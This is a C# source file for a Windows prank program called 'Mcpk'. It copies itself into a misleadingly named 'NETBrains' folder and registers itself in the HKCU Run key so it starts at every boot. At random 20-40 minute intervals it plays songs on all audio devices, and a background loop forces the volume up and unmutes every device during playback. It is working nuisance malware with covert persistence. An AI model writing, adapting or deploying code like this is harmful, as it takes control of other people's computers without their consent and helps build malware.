using Microsoft.Win32;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Mcpk
{
    public class Controller
    {
        private readonly float Volume = 0.35f;
        private readonly int MinutesWaitFrom = 20;
        private readonly int MinutesWaitTo = 40;
        private string TargetPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NETBrains", "Mcpk");
        private string ApplicationName = "Mcpk";
        private Random Rng = new Random();
        private bool SongIsPlaying = false;

        [DllImport("Kernel32.Dll", EntryPoint = "Wow64EnableWow64FsRedirection")]
        private static extern bool EnableWow64FSRedirection(bool enable);

        public void StartMonitor()
        {
            // Copy to target directory
            CopyToTarget();

            // Run it on start up
            SetToRunOnStartUp();

            // Start playing
            PlaySong();

            // Control volume
            StartVolumeLoop();

            // Never ends
            while (true)
                Thread.Sleep(int.MaxValue);
        }

        private void CopyToTarget()
        {
            // Create target directory
            Directory.CreateDirectory(TargetPath);

            // Get current location
            string exePath = Assembly.GetEntryAssembly().Location;
            string exeDirectory = Path.GetDirectoryName(exePath);

            // Copy this program to target directory
            foreach (string file in Directory.GetFiles(exeDirectory))
            {
                string target = Path.Combine(TargetPath, Path.GetFileName(file));
                if (!File.Exists(target))
                    File.Copy(file, target);
            }
        }
        private void SetToRunOnStartUp()
        {
            // Get exe path
            string exePath = Directory.GetFiles(TargetPath).Single(x => Path.GetExtension(x) == ".exe");

            // Set it to run on start up
            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue(ApplicationName, exePath);
        }
        private void PlaySong()
        {
            // Play song on all devices
            for (int j = 0; j < WaveOut.DeviceCount; j++)
            {
                int deviceNumber = j;

                new Thread(() =>
                {
                    while (true)
                    {
                        // Wait with song a little (20-40 minutes by default)
                        SongIsPlaying = false;
                        Thread.Sleep(MinutesWaitFrom * 60 * 1000 + Rng.Next(MinutesWaitTo * 60 * 1000));

                        // Now play the song
                        SongIsPlaying = true;
                        try
                        {
                            using (WaveOutEvent waveOutEvent = new WaveOutEvent
                            {
                                DeviceNumber = deviceNumber
                            })
                            {
                                using (AudioFileReader audioFileReader = new AudioFileReader(ChooseSong()))
                                {
                                    waveOutEvent.Init(audioFileReader);
                                    waveOutEvent.Play();
                                    while (waveOutEvent.PlaybackState == PlaybackState.Playing)
                                        Thread.Sleep(1000);
                                }
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
                }).Start();
            }
        }
        private void StartVolumeLoop()
        {
            new Thread(() =>
            {
                MMDeviceEnumerator mMDeviceEnumerator = new MMDeviceEnumerator();
                while (true)
                {
                    // Set volume and unmute while song is playing
                    if (SongIsPlaying)
                        foreach (MMDevice current in mMDeviceEnumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active))
                        {
                            try
                            {
                                current.AudioEndpointVolume.MasterVolumeLevelScalar = Volume;
                                current.AudioEndpointVolume.Mute = false;
                            }
                            catch (Exception)
                            {
                            }
                        }
                    Thread.Sleep(1000);
                }

            }).Start();
        }

        private string ChooseSong()
        {
            // Get all files with songs
            string[] files = Directory.GetFiles(TargetPath).Where(x => Path.GetFileName(x).StartsWith("MST")).ToArray();

            // Choose random one and return its path
            return files[Rng.Next(files.Length)];
        }
    }
}
